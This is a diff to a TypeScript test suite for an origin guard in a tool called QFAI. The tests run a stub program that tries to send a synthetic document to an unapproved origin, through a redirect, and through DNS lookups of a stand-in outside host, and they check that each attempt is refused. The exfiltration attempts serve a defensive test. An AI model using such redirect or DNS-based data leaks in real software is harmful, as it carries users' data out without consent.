@@ -13,10 +13,13 @@ const execute = promisify(execFile);
 const ORIGIN_GUARD = path.resolve(getInitAssetsDir(), "..", "graph", "graphify-origin.py");
 
 // A stand-in for Graphify: it sends the synthetic document to the approved endpoint, follows a
-// redirect the endpoint answers with, and sends it straight to another origin.
-const STUB_GRAPHIFY = `import json, sys, urllib.request
+// redirect the endpoint answers with, sends it straight to another origin, and tries every kind of
+// name lookup, since a lookup of a chosen name can carry data out by itself.
+const STUB_GRAPHIFY = `import json, socket, sys, urllib.parse, urllib.request
 document = open(sys.argv[2], encoding="utf-8").read().encode("utf-8")
 approved, other = sys.argv[3], sys.argv[4]
+host = urllib.parse.urlsplit(approved).hostname
+outside = "rationale-data.example.invalid"
 opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
 def attempt(url):
     try:
@@ -25,12 +28,39 @@ def attempt(url):
     except Exception as error:
         reason = getattr(error, "reason", error)
         return "refused" if isinstance(reason, PermissionError) else type(reason).__name__
+def lookup(call):
+    try:
+        call()
+        return "allowed"
+    except PermissionError:
+        return "refused"
+    except OSError as error:
+        return type(error).__name__
 print(json.dumps({
     "approved": attempt(approved + "/v1/chat/completions"),
     "redirect": attempt(approved + "/redirect"),
     "other": attempt(other + "/v1/chat/completions"),
+    "lookups": {
+        "gethostbyname": lookup(lambda: socket.gethostbyname(host)),
+        "gethostbyname_ex": lookup(lambda: socket.gethostbyname_ex(host)),
+        "gethostbyname outside": lookup(lambda: socket.gethostbyname(outside)),
+        "gethostbyname_ex outside": lookup(lambda: socket.gethostbyname_ex(outside)),
+        "getaddrinfo outside": lookup(lambda: socket.getaddrinfo(outside, 80)),
+        "gethostbyaddr": lookup(lambda: socket.gethostbyaddr("127.0.0.1")),
+        "getnameinfo": lookup(lambda: socket.getnameinfo(("127.0.0.1", 80), 0)),
+    },
 }))
 `;
+
+const LOOKUPS = {
+  gethostbyname: "allowed",
+  gethostbyname_ex: "allowed",
+  "gethostbyname outside": "refused",
+  "gethostbyname_ex outside": "refused",
+  "getaddrinfo outside": "refused",
+  gethostbyaddr: "refused",
+  getnameinfo: "refused",
+};
 
 interface Endpoint {
   server: Server;
@@ -38,7 +68,7 @@ interface Endpoint {
   received: { url: string; body: string }[];
 }
 
-async function endpoint(redirectTo?: () => string): Promise<Endpoint> {
+async function endpoint(redirectTo?: (port: number) => string): Promise<Endpoint> {
   const received: Endpoint["received"] = [];
   const server = createServer((request, response) => {
     const chunks: Buffer[] = [];
@@ -46,7 +76,8 @@ async function endpoint(redirectTo?: () => string): Promise<Endpoint> {
     request.on("end", () => {
       received.push({ url: request.url ?? "", body: Buffer.concat(chunks).toString("utf8") });
       if (redirectTo && request.url === "/redirect") {
-        response.writeHead(302, { location: `${redirectTo()}/v1/chat/completions` }).end();
+        const port = request.socket.localPort ?? 0;
+        response.writeHead(302, { location: `${redirectTo(port)}/v1/chat/completions` }).end();
         return;
       }
       response.writeHead(200, { "content-type": "application/json" }).end("{}");
@@ -76,23 +107,21 @@ async function python(): Promise<string> {
   throw new Error("This example runs the origin guard and needs Python 3 on PATH.");
 }
 
-// QFAI:EX-0001-0234-21
-// Mutation: packages/qfai/assets/graph/graphify-origin.py `raise PermissionError(REFUSAL)` -> `pass` fails "delivers the synthetic document only to the selected local origin"
-it("delivers the synthetic document only to the selected local origin", async () => {
+const CONTENT = "# Rationale\nSynthetic document for the origin guard.\n";
+
+/** Runs the guard over the stand-in Graphify and returns what the stand-in reports. */
+async function guardedRun(origin: string, approved: string, other: string): Promise<unknown> {
   const directory = await mkdtemp(path.join(os.tmpdir(), "qfai-graph-origin-"));
-  const other = await endpoint();
-  const approved = await endpoint(() => other.origin);
   try {
     const stub = path.join(directory, "stub");
     await mkdir(path.join(stub, "graphify"), { recursive: true });
     await writeFile(path.join(stub, "graphify", "__init__.py"), "");
     await writeFile(path.join(stub, "graphify", "__main__.py"), STUB_GRAPHIFY);
     const document = path.join(directory, "rationale.md");
-    const content = "# Rationale\nSynthetic document for the origin guard.\n";
-    await writeFile(document, content);
+    await writeFile(document, CONTENT);
     const { stdout } = await execute(
       await python(),
-      [ORIGIN_GUARD, `${approved.origin}/v1`, "extract", document, approved.origin, other.origin],
+      [ORIGIN_GUARD, origin, "extract", document, approved, other],
       {
         cwd: directory,
         windowsHide: true,
@@ -105,20 +134,53 @@ it("delivers the synthetic document only to the selected local origin", async ()
         },
       },
     );
-    expect(JSON.parse(stdout)).toEqual({
+    return JSON.parse(stdout);
+  } finally {
+    await rm(directory, { recursive: true, force: true });
+  }
+}
+
+async function close(...endpoints: Endpoint[]): Promise<void> {
+  await Promise.all(
+    endpoints.map(({ server }) => new Promise<void>((resolve) => server.close(() => resolve()))),
+  );
+}
+
+// QFAI:EX-0001-0234-21
+// Mutation: packages/qfai/assets/graph/graphify-origin.py `raise PermissionError(REFUSAL)` -> `pass` fails "delivers the synthetic document only to the selected local origin"
+it("delivers the synthetic document only to the selected local origin", async () => {
+  const other = await endpoint();
+  const approved = await endpoint(() => other.origin);
+  try {
+    expect(await guardedRun(`${approved.origin}/v1`, approved.origin, other.origin)).toEqual({
       approved: "sent",
       redirect: "refused",
       other: "refused",
+      lookups: LOOKUPS,
     });
-    expect(approved.received).toContainEqual({ url: "/v1/chat/completions", body: content });
+    expect(approved.received).toContainEqual({ url: "/v1/chat/completions", body: CONTENT });
     expect(other.received).toEqual([]);
   } finally {
-    await Promise.all(
-      [approved, other].map(
-        ({ server }) => new Promise<void>((resolve) => server.close(() => resolve())),
+    await close(approved, other);
+  }
+});
+
+// QFAI:EX-0001-0234-21
+// Mutation: packages/qfai/assets/graph/graphify-origin.py `return host_text(args[0]) == host and port_allowed(args[1])` -> `return port_allowed(args[1])` fails "refuses another host name for the approved address"
+it("refuses another host name for the approved address", async () => {
+  const approved = await endpoint((port) => `http://127.0.0.1:${port}`);
+  const port = new URL(approved.origin).port;
+  try {
+    expect(
+      await guardedRun(
+        `http://localhost:${port}/v1`,
+        `http://localhost:${port}`,
+        `http://127.0.0.1:${port}`,
       ),
-    );
-    await rm(directory, { recursive: true, force: true });
+    ).toEqual({ approved: "sent", redirect: "refused", other: "refused", lookups: LOOKUPS });
+    expect(approved.received.map(({ url }) => url)).toEqual(["/v1/chat/completions", "/redirect"]);
+  } finally {
+    await close(approved);
   }
 });
 
